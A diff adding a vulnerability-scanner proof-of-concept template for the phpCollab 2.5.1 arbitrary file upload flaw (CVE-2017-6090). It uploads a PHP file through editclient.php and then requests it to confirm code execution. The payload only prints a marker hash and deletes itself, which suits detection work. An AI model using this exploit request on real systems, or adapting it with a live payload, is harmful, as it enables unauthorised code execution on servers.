@@ -1,0 +1,62 @@
+[info]
+author = "ave"
+description = "利用phpCollab 2.5.1的任意文件上传漏洞，攻击者可通过clients/editclient.php上传可执行的PHP文件到logos_clients目录中，然后通过直接请求恶意文件实现任意代码执行"
+id = "POC-AVE-2017-0121"
+name = "PhpCollab 2.5.1 Arbitrary File Upload PoC"
+severity = "high"
+tags = ["ave-2017-0121"]
+vuln_id = [
+    "CVE-2017-6090",
+    "AVE-2017-0121",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/clients/editclient.php"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+-----------------------------154934846911423734231554128137
+Content-Disposition: form-data; name="upload"; filename="{{randstr}}.php"
+Content-Type: application/x-php
+<?php echo md5("phpcollab_rce");unlink(__FILE__);?>
+-----------------------------154934846911423734231554128137--"""
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "upload",
+    "success",
+    "uploaded",
+    "logo",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/logos_clients/{{randstr}}.php"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["48dbd2384cb6b996fa1e2855c7f0567f"]
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+status = [200]
+type = "status"
